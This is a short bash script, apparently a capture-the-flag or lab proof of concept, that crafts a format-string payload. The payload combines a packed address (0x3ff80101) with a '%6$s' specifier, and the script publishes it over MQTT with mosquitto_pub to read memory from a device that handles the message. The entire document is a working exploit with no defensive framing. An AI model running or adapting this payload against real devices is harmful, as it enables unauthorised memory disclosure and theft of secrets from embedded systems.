#!/bin/bash

command_prefix="mosquitto_pub -h 0.0.0.0 -t /topic/qos0 -m"

newline=$(echo "0a0d" | xxd -p -r) # \r\n

address="$(echo 0101f83f | xxd -p -r)" # 0x3ff80101

# Print the string starting at 0x3ff80101
printer="$newline%6\$s$newline" 

# Craft the payload
payload=$address$printer

# Print the payload out
if [ $# -gt 0 ]; then
    echo "PAYLOAD (as hexdump):"
    echo $payload | xxd -p
fi

$command_prefix "$payload"